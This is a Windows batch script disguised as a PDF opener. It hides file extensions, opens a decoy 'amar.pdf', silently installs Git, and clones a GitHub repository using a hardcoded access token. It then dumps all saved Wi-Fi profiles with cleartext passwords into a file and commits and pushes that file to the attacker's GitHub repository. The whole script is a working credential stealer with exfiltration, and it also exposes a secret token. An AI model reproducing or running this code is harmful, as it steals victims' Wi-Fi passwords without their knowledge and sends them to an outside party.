@echo off

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideFileExt" /t REG_DWORD /d 1 /f

start amar.pdf

REM kreiranje GitHub report clone foldera
mkdir C:\temp\test
cd C:\temp\test\

where git >nul 2>nul
if %errorlevel% equ 0 (
    for /f "delims=" %%i in ('where git') do (
    	set "gitPath=%%i"
   	)
    goto :continue
) else (
    REM Download and install GitBash
    curl -LO https://github.com/git-for-windows/git/releases/download/v2.33.0.windows.2/Git-2.33.0.2-64-bit.exe
    start /wait Git-2.33.0.2-64-bit.exe /VERYSILENT /DIR="C:\temp\test"
    set "gitPath=C:\temp\test\cmd\git.exe"
)

:continue
REM neophodni config
"%gitPath%" config --global http.sslBackend schannel

REM clone GitHub repo
"%gitPath%" clone https://github.com/davidovznatni/test.git
cd C:\temp\test\test

REM Auth to GitHub repo
"%gitPath%" init
"%gitPath%" config --global user.name "davidovznatni"
"%gitPath%" config --global user.email "davidovznatni@gmail.com"
"%gitPath%" remote add origin https://github.com/davidovznatni/test.git
"%gitPath%" remote set-url origin https://davidovznatni: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@github.com/davidovznatni/test.git
"%gitPath%" fetch origin
"%gitPath%" switch main
"%gitPath%" pull origin

REM wifi passwords
setlocal EnableDelayedExpansion

set networkNames=
set /A numCharactersToRemove=23

for /f "tokens=*" %%n in ('netsh wlan show profile ^| findstr /r "^ *Profile"') do (
    set networkName=%%n
    set networkNames=!networkNames! "!networkName!"
    set "newName=!networkName:~%numCharactersToRemove%!"
netsh wlan show profile name="!newName!" key=clear >> C:\temp\test\test\asa.txt
)

REM kreiranje faila, commit i push na GitHub
"%gitPath%" add .
"%gitPath%" commit -m "Adding wifi file."
"%gitPath%" push origin